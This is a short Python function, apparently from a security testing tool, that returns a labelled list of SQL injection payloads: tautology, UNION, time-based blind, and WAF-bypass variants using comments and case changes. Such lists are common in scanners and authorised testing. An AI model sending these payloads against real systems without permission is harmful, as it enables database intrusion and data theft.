def get_sqli_payloads():
    return [
        {"type": "Error-Based", "payload": "' OR 1=1 --"},
        {"type": "Union-Based", "payload": "' UNION SELECT NULL,NULL --"},
        {"type": "Blind", "payload": "' AND SLEEP(5) --"},
        {"type": "WAF-Bypass", "payload": "'/*!UNION*/SELECT/**/NULL,NULL--"},
        {"type": "Case Variation", "payload": "' UnIoN SeLeCt NULL,NULL--"},
        {"type": "Special Char", "payload": "' OR 1=1#"},
    ]
